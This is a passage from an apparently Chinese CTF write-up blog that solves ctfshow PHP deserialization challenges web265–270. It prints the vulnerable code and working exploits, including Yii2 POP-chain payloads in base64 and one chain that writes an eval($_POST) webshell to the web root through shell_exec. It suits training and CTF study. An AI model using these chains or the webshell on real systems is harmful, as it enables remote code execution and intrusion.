class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfshowAdmin</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$token</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$t</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;token=<span class=\"variable\">$t</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$p</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;token===<span class=\"variable language_\">$this</span>-&gt;password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$ctfshow</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ctfshow&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$ctfshow</span>-&gt;token=<span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">mt_rand</span>());</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$ctfshow</span>-&gt;<span class=\"title function_ invoke__\">login</span>())&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>php 的特性，按地址传参</p>\n<p>例如 $a = 1  <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi><mo>=</mo><mn>2</mn><mo separator=\"true\">,</mo><mtext>这时让</mtext></mrow><annotation encoding=\"application/x-tex\">b = 2, 这时让</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">这</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">让</span></span></span></span> b = &amp;<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mo separator=\"true\">,</mo><mtext>再给</mtext></mrow><annotation encoding=\"application/x-tex\">a, 再给</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">再</span><span class=\"mord cjk_fallback\">给</span></span></span></span> a 重新赋个值 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mo>=</mo><mn>3</mn><mo separator=\"true\">,</mo><mtext>这个时候</mtext></mrow><annotation encoding=\"application/x-tex\">a = 3, 这个时候</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">这</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">候</span></span></span></span> b 就会一直跟着 $a 变化，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mtext>是什么</mtext></mrow><annotation encoding=\"application/x-tex\">a是什么</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">什</span><span class=\"mord cjk_fallback\">么</span></span></span></span> b 就是什么</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"string\">&#x27;123&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$b</span>=&amp;<span class=\"variable\">$a</span>;</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这个就会发现，a 的值会跟着 b 一起改变。所以 payload 可以如下生成：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfshowAdmin</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$token</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;token = <span class=\"string\">&#x27;a&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password =&amp; <span class=\"variable language_\">$this</span>-&gt;token;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">ctfshowAdmin</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"web266\"><a class=\"markdownIt-Anchor\" href=\"#web266\">#</a> web266：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$cs</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://input&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfshow</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username=<span class=\"variable\">$u</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password=<span class=\"variable\">$p</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;username===<span class=\"variable language_\">$this</span>-&gt;password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;username;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$ctfshowo</span>=@<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$cs</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/ctfshow/&#x27;</span>, <span class=\"variable\">$cs</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Exception</span>(<span class=\"string\">&quot;Error <span class=\"subst\">$ctfshowo</span>&quot;</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t首先，$cs = file_get_contents (‘php://input’);，可以访问请求的原始数据流，可以获取到 GET 和 POST 的数据，那么，这里就可以通过 post 发一个包，数据流是一个 ctfshow 的一个序列化后的字符串，这里需要触发 <code>__destruct</code>  方法， 传入一个 <code>O:7:&quot;ctfshow&quot;:2:&#123;&#125;</code>  即可输出 flag，但是具体是为啥就不大清楚了，没有修改那个为 2 的话，就无法触发 destruct。因为估计是破坏序列化后的结果，仍会执行__destruct。</p>\n<h1 id=\"web267\"><a class=\"markdownIt-Anchor\" href=\"#web267\">#</a> web267：</h1>\n<p>​\t\t考点，yii 框架反序列化漏洞。</p>\n<p>​\t\t查看源码，在最后发现如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;/assets/b021fd51/yii.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t推测应该是 yii 框架，虽然还没学这个是个啥，右上角发现了 login，点进去是一个登陆页面，账号为 admin，弱密码爆破一下，得到密码为 admin，之后点右上角的 about，有一个注释：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--?view-source --&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t前面加了个问好，是提示我们需要 get 传参，传一个后发现反序列化的一个代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">///backdoor/shell</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>]))</span><br></pre></td></tr></table></figure>\n<p>​\t\t进入 yii.js 后提示 yii 版本：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Yii JavaScript module.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@link</span> http://www.yiiframework.com/</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@copyright</span> Copyright (c) 2008 Yii Software LLC</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@license</span> http://www.yiiframework.com/license/</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@author</span> Qiang Xue &lt;qiang.xue<span class=\"doctag\">@gmail</span>.com&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@since</span> 2.0</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后查找历史漏洞找到了一下 poc，这个漏洞有条件再看，现在先不看，直接用 poc 打：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">yii</span>\\<span class=\"title class_\">rest</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">class</span> <span class=\"title class_\">CreateAction</span>&#123;</span><br><span class=\"line\">        <span class=\"title class_\">public</span> $<span class=\"title class_\">checkAccess</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$id</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;checkAccess = <span class=\"string\">&#x27;phpinfo&#x27;</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;id = <span class=\"string\">&#x27;1&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Faker</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">yii</span>\\<span class=\"title class_\">rest</span>\\<span class=\"title class_\">CreateAction</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Generator</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$formatters</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;formatters[<span class=\"string\">&#x27;close&#x27;</span>] = [<span class=\"keyword\">new</span> <span class=\"title class_\">CreateAction</span>(), <span class=\"string\">&#x27;run&#x27;</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">yii</span>\\<span class=\"title class_\">db</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">Faker</span>\\<span class=\"title class_\">Generator</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BatchQueryResult</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$_dataReader</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;_dataReader = <span class=\"keyword\">new</span> <span class=\"built_in\">Generator</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">echo</span> <span class=\"title class_\">base64_encode</span>(<span class=\"title class_\">serialize</span>(<span class=\"title class_\">new</span> <span class=\"title class_\">yii</span>\\<span class=\"title class_\">db</span>\\<span class=\"title class_\">BatchQueryResult</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后通过 get 上传：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?r=/backdoor/shell<span class=\"built_in\">&amp;</span>code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure>\n<p>​\t\t就能打出 phpinfo，之后使用 passthru 即可获得 flag，system 没有回显，不知道为啥，不过也可以 echo 一句话木马进一个文件也行。</p>\n<h1 id=\"web268\"><a class=\"markdownIt-Anchor\" href=\"#web268\">#</a> web268：</h1>\n<p>​\t\t相比于上一题有过滤，换一个 poc 即可：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">yii</span>\\<span class=\"title class_\">rest</span> &#123;</span><br><span class=\"line\">    <span class=\"title class_\">class</span> <span class=\"title class_\">Action</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title class_\">public</span> $<span class=\"title class_\">checkAccess</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexAction</span></span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$param</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;checkAccess = <span class=\"variable\">$func</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;id = <span class=\"variable\">$param</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">yii</span>\\<span class=\"title class_\">web</span> &#123;</span><br><span class=\"line\">    <span class=\"title class_\">abstract</span> <span class=\"title class_\">class</span> <span class=\"title class_\">MultiFieldSession</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title class_\">public</span> $<span class=\"title class_\">writeCallback</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DbSession</span> <span class=\"keyword\">extends</span> <span class=\"title\">MultiFieldSession</span></span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$param</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;writeCallback = [<span class=\"keyword\">new</span> \\yii\\rest\\<span class=\"title function_ invoke__\">IndexAction</span>(<span class=\"variable\">$func</span>, <span class=\"variable\">$param</span>), <span class=\"string\">&quot;run&quot;</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">yii</span>\\<span class=\"title class_\">db</span> &#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">yii</span>\\<span class=\"title class_\">base</span>\\<span class=\"title class_\">BaseObject</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BatchQueryResult</span></span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$_dataReader</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$func</span>, <span class=\"variable\">$param</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;_dataReader = <span class=\"keyword\">new</span> \\yii\\web\\<span class=\"title function_ invoke__\">DbSession</span>(<span class=\"variable\">$func</span>, <span class=\"variable\">$param</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> &#123;</span><br><span class=\"line\">    $<span class=\"title class_\">exp</span> = <span class=\"title class_\">new</span> \\<span class=\"title class_\">yii</span>\\<span class=\"title class_\">db</span>\\<span class=\"title class_\">BatchQueryResult</span>(&#x27;<span class=\"title class_\">shell_exec</span>&#x27;, &quot;<span class=\"title class_\">echo</span> &#x27;&lt;?<span class=\"title class_\">php</span> <span class=\"title class_\">eval</span>(\\$<span class=\"title class_\">_POST</span>[1]);<span class=\"title function_ invoke__\">phpinfo</span>();<span class=\"meta\">?&gt;</span><span class=\"string\">&#x27; &gt; /var/www/html/basic/web/1.php&quot;);</span></span><br><span class=\"line\"><span class=\"string\">    echo(base64_encode(serialize($exp)));</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后 exp 为：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?r=/backdoor/shell<span class=\"built_in\">&amp;</span>code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo3MzoiZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PicgPiAvdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8xLnBocCI7fWk6MTtzOjM6InJ1biI7fX19</span><br></pre></td></tr></table></figure>\n<p>​\t\t然后访问 1.php 然后 post 一个 1=system (“cat /flags”); 即可</p>\n<h1 id=\"web269\"><a class=\"markdownIt-Anchor\" href=\"#web269\">#</a> web269：</h1>\n<p>​\t\t和上一个题一模一样，没任何区别。</p>\n<h1 id=\"web270\"><a class=\"markdownIt-Anchor\" href=\"#web270\">#</a> web270：</h1>\n<p>​\t\t268 题的 poc 依旧能用，直接用。</p>\n<h1 id=\"web271\"><a class=\"markdownIt-Anchor\" href=\"#web271\">#</a> 